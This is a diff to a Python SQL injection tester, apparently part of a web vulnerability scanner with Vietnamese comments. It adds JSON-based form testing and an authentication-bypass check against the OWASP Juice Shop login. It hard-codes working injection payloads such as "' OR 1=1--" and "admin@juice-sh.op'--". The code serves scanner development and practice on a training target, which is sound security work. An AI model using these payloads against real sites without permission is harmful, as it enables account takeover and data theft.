@@ -1,4 +1,5 @@
 import time
+import json
 from typing import Optional
 from urllib.parse import urlparse, parse_qs, urlunparse, urlencode
 import requests
@@ -22,8 +23,6 @@ class SqliTester(BaseTester):
             return None
 
         query_params = parse_qs(parsed_url.query)
-
-        # Fetch baseline response for comparison
         base_response = self.fetch(url)
         if not base_response:
             return None
@@ -31,13 +30,10 @@ class SqliTester(BaseTester):
         for param in query_params:
             original_value = query_params[param]
 
-            # --- 1. ERROR-BASED VERIFICATION ---
             for payload in self.error_payloads:
                 try:
                     resp = self._inject_payload(parsed_url, query_params, param, payload)
                     if resp and any(err.lower() in resp.text.lower() for err in self.error_patterns):
-                        # VERIFY: Inject a safe payload (e.g., an integer) to see if the error disappears.
-                        # If the error persists with safe input, it's likely a hardcoded error message (False Positive).
                         safe_val = "123456"
                         safe_resp = self._inject_payload(parsed_url, query_params, param, safe_val)
 
@@ -59,7 +55,6 @@ class SqliTester(BaseTester):
                 except requests.RequestException:
                     continue
 
-            # --- 2. TIME-BASED VERIFICATION ---
             for payload in self.time_payloads:
                 try:
                     start_time = time.time()
@@ -67,13 +62,11 @@ class SqliTester(BaseTester):
                     elapsed_time = time.time() - start_time
 
                     if elapsed_time > self.time_delay_threshold:
-                        # VERIFY: Send the request again with a benign value (original value)
-                        # to ensure the server isn't just naturally slow.
                         start_verify = time.time()
                         self._inject_payload(parsed_url, query_params, param, str(original_value[0]))
                         elapsed_verify = time.time() - start_verify
 
-                        if elapsed_verify < 2:  # If normal request is fast (<2s) but payload is slow (>Threshold)
+                        if elapsed_verify < 2:
                             return Vulnerability(
                                 type='SQL Injection',
                                 subcategory='Time-Based',
@@ -90,9 +83,6 @@ class SqliTester(BaseTester):
                 except requests.RequestException:
                     continue
 
-            # --- 3. BOOLEAN-BASED VERIFICATION ---
-            # Logic: Page(AND 1=1) should be similar to Baseline.
-            #        Page(AND 1=2) should be different from Baseline.
             true_payload = "' AND 1=1--"
             false_payload = "' AND 1=2--"
 
@@ -104,7 +94,6 @@ class SqliTester(BaseTester):
                     sim_true = self._calculate_similarity(base_response.text, resp_true.text)
                     sim_false = self._calculate_similarity(base_response.text, resp_false.text)
 
-                    # Thresholds: True payload matches baseline > 95%, False payload matches < 90%
                     if sim_true > 0.95 and sim_false < 0.90:
                         return Vulnerability(
                             type='SQL Injection',
@@ -125,45 +114,62 @@ class SqliTester(BaseTester):
 
         return None
 
-    def _inject_payload(self, parsed_url, params, target_param, payload):
-        test_params = params.copy()
-        test_params[target_param] = payload
-        test_url = urlunparse(parsed_url._replace(query=urlencode(test_params, doseq=True)))
-        # Force a fresh request without using the cache for injection attempts
-        return self.session.get(test_url, timeout=15, verify=False)
-
     def test_form(self, form_data: dict) -> Optional[Vulnerability]:
-        """Kiểm tra SQLi trên POST/GET Forms"""
         if form_data['method'] != 'POST':
-            return None  # Form GET thì URL parameter đã lo rồi
+            return None
 
         url = form_data['url']
         inputs = form_data['inputs']
 
-        # Lấy trang gốc làm baseline so sánh
-        base_resp = self.session.post(url, data={i['name']: i['value'] for i in inputs}, timeout=10, verify=False)
-        if not base_resp: return None
+        is_api = any(keyword in url.lower() for keyword in ['/api/', '/rest/', '/v1/', '/v2/'])
+
+        base_resp = self._inject_form_payload(url, inputs, None, None, is_api)
+        if not base_resp:
+            return None
 
         for target_input in inputs:
-            # Bỏ qua không tiêm payload vào hidden field, submit button, radio
             if target_input['type'] in ['hidden', 'submit', 'radio', 'checkbox', 'button']:
                 continue
 
             param = target_input['name']
+
+            # --- KIỂM TRA ĐẶC BIỆT: SQLi AUTH BYPASS (OWASP Juice Shop Login) ---
+            auth_bypass_payloads = ["' OR 1=1--", "' OR '1'='1", "admin@juice-sh.op'--"]
+            for payload in auth_bypass_payloads:
+                try:
+                    resp = self._inject_form_payload(url, inputs, param, payload, is_api)
+                    if resp and resp.status_code in [200, 201]:
+                        # Nếu API trả về 200 OK và chứa token/session khi tiêm payload
+                        if any(k in resp.text.lower() for k in ['token', 'session', 'success', 'jwt', 'user']):
+                            # Verify lại bằng payload sai
+                            bad_resp = self._inject_form_payload(url, inputs, param, "' AND 1=2--", is_api)
+                            if bad_resp and bad_resp.status_code in [401, 403, 404, 500]:
+                                return Vulnerability(
+                                    type='SQL Injection', subcategory='Authentication Bypass', url=url,
+                                    details={
+                                        'parameter': f"POST Body: {param}", 'payload': payload,
+                                        'evidence': 'Successful authentication bypass using SQL injection payload.'
+                                    },
+                                    severity='Critical'
+                                )
+                except requests.RequestException:
+                    pass
 
             # --- BOOLEAN-BASED VERIFICATION TRÊN POST FORM ---
             true_payload = "' AND 1=1--"
             false_payload = "' AND 1=2--"
 
             try:
-                resp_true = self._inject_form_payload(url, inputs, param, true_payload)
-                resp_false = self._inject_form_payload(url, inputs, param, false_payload)
+                resp_true = self._inject_form_payload(url, inputs, param, true_payload, is_api)
+                resp_false = self._inject_form_payload(url, inputs, param, false_payload, is_api)
 
                 if resp_true and resp_false:
                     sim_true = self._calculate_similarity(base_resp.text, resp_true.text)
                     sim_false = self._calculate_similarity(base_resp.text, resp_false.text)
 
-                    if sim_true > 0.95 and sim_false < 0.90:
+                    # Cập nhật ngưỡng cho API JSON (thường khác biệt lớn khi có lỗi)
+                    if (sim_true > 0.95 and sim_false < 0.90) or (
+                            resp_true.status_code == 200 and resp_false.status_code >= 400):
                         return Vulnerability(
                             type='SQL Injection', subcategory='Boolean-Based (POST Form)', url=url,
                             details={
@@ -176,18 +182,26 @@ class SqliTester(BaseTester):
             except requests.RequestException:
                 pass
 
-            # Tương tự, bạn copy logic Error-Based và Time-based từ hàm test() cũ
-            # thay _inject_payload bằng _inject_form_payload
-
         return None
 
-    def _inject_form_payload(self, url, inputs, target_param, payload):
-        """Build POST body giữ nguyên CSRF tokens, chỉ thay target_param bằng payload"""
+    def _inject_payload(self, parsed_url, params, target_param, payload):
+        test_params = params.copy()
+        test_params[target_param] = payload
+        test_url = urlunparse(parsed_url._replace(query=urlencode(test_params, doseq=True)))
+        return self.session.get(test_url, timeout=15, verify=False, headers={'ngrok-skip-browser-warning': 'true'})
+
+    def _inject_form_payload(self, url, inputs, target_param, payload, is_api=False):
         data = {}
         for inp in inputs:
-            if inp['name'] == target_param:
+            if target_param and inp['name'] == target_param:
                 data[inp['name']] = payload
             else:
-                data[inp['name']] = inp['value']  # Giữ nguyên value gốc
+                data[inp['name']] = inp['value']
 
-        return self.session.post(url, data=data, timeout=15, verify=False)
+        headers = {'ngrok-skip-browser-warning': 'true'}
+        if is_api:
+            # Gửi dạng JSON nếu là REST API
+            return self.session.post(url, json=data, timeout=15, verify=False, headers=headers)
+        else:
+            # Gửi dạng Form truyền thống
+            return self.session.post(url, data=data, timeout=15, verify=False, headers=headers)
